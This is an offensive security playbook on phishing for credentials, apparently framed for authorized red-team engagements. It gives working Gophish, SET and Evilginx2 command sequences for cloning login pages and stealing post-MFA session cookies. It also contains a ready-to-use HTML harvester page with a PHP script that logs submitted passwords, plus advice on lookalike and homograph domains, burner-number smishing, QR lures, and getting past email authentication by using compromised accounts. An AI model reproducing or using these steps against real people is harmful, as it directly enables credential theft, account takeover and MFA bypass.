# Password Attacks — Phishing for Credentials

## When this applies

- Engagement scope explicitly authorizes social-engineering / phishing.
- The technical attack surface is hardened; user behavior is the weakest link.
- Goal: trick users into voluntarily entering credentials on an attacker-controlled page.

## Technique

Build a convincing fake login page (cloned target UI), distribute the URL via email/SMS/IM, and capture submitted credentials. Modern variant uses reverse-proxy tooling (Evilginx2) to intercept the live OAuth/SAML flow including MFA tokens.

## Steps

### 1. Phishing types

| Type | Description |
|---|---|
| **Email phishing** | Generic mass-mailed lures |
| **Spear phishing** | Targeted at specific individuals |
| **Whaling** | Targets executives |
| **Smishing** | SMS phishing |
| **Vishing** | Voice phishing |
| **Quishing** | QR-code phishing |

### 2. Tool selection

| Tool | Use case |
|---|---|
| **Gophish** | Open-source phishing campaign manager |
| **SET (Social Engineer Toolkit)** | Quick site-clone + harvester |
| **King Phisher** | Campaign management |
| **CredSniper** | Credential capture page |
| **Evilginx2** | Reverse-proxy MFA-bypass phishing |
| **Modlishka** | Reverse-proxy MFA-bypass (alternative) |

### 3. Gophish quick start

```bash
./gophish
# Web UI at https://localhost:3333
# Default creds: admin:gophish (change immediately)

# Steps in UI:
# 1. Create sending profile (SMTP)
# 2. Import / create user list
# 3. Build email template (HTML + tracking image)
# 4. Build landing page (cloned login)
# 5. Launch campaign
```

### 4. SET quick clone

```bash
setoolkit
# Select: 1) Social-Engineering Attacks
# Select: 2) Website Attack Vectors
# Select: 3) Credential Harvester Attack Method
# Select: 2) Site Cloner
# Enter target URL → SET clones the login page and starts capture server
```

### 5. Evilginx2 (MFA-bypass via reverse proxy)

```bash
./evilginx2 -p phishlets/
config domain victim-portal.com    # Your registered phishing domain
config ip <YOUR_IP>
phishlets enable office365
lures create office365
lures get-url 0
```

When victim visits the lure URL:
1. Their request proxies to real Microsoft login.
2. They authenticate (including MFA).
3. Evilginx captures session cookies AFTER MFA succeeds.
4. Attacker imports cookies into their browser → authenticated as victim, MFA satisfied.

### 6. Manual credential harvester page

Minimal cloned login:

```html
<!DOCTYPE html>
<html>
<head><title>Login - Company Portal</title></head>
<body>
<form action="capture.php" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
</body>
</html>
```

`capture.php`:
```php
<?php
file_put_contents('creds.txt',
    date('Y-m-d H:i:s') . " | " .
    $_POST['username'] . " | " .
    $_POST['password'] . "\n",
    FILE_APPEND);
header('Location: https://real-target.com/login');
?>
```

Redirect to real login after capture so the user thinks they mistyped and tries again at the legitimate site.

### 7. Lure design tips

- Match target's email layout / signature exactly.
- Use registered domains that LOOK legitimate (`micros0ft-login.com`, `comp4ny-portal.io`).
- Punycode (IDN) homograph attacks: `соmpany.com` (Cyrillic `с`) looks like `company.com`.
- Tight time pressure ("password expires in 24 hours").
- Authority pretexts (CEO, IT support, HR).

### 8. SMS / Smishing

```bash
# Burner Twilio account → send SMS lures
# Body: "Your account requires verification: <shortened-link>"
```

Mobile users are more likely to click without inspecting URLs.

### 9. QR-code phishing

```bash
# Generate QR code pointing to phishing URL
qrencode -o qr.png "https://victim-portal.com/login"
```

Print on physical signage / posters; users scan and authenticate.

### 10. Track campaign metrics

Gophish dashboard shows:
- Email opens (tracking pixel).
- Link clicks.
- Credentials submitted.
- MFA captured (Evilginx).

Document for the engagement report.

## Verifying success

- Captured credentials authenticate against the real target.
- MFA-protected accounts are accessible if Evilginx captured session cookies.
- Statistical: % of recipients who clicked / submitted.

## Common pitfalls

- DMARC / SPF / DKIM enforcement blocks spoofed emails. Use compromised legitimate email accounts or properly-configured attacker domains with matching DNS.
- URL shortener / sender domain reputation services (Cloudflare, Microsoft) flag phishing URLs within hours.
- Anti-phishing browser warnings (Safe Browsing, SmartScreen) intercept known bad URLs.
- Modern browsers warn on punycode-mismatched URLs.
- MFA-protected accounts require Evilginx-style proxy phishing — basic credential harvesters fail.
- Some users report phishing emails — be ready for the engagement contact to receive reports.

## Tools

- Gophish (campaign management).
- Evilginx2 / Modlishka (MFA bypass).
- SET (quick prototyping).
- mitmproxy / Burp (custom proxy phishing).
- DNS twist (`dnstwist`) for similar-looking domain registration.
- httrack for site cloning.

## References

- MITRE ATT&CK T1566 (Phishing).
- CWE-1390 (Weak Authentication).
- OWASP Phishing.
- Evilginx2: https://github.com/kgretzky/evilginx2
- Gophish: https://www.getgophish.com/
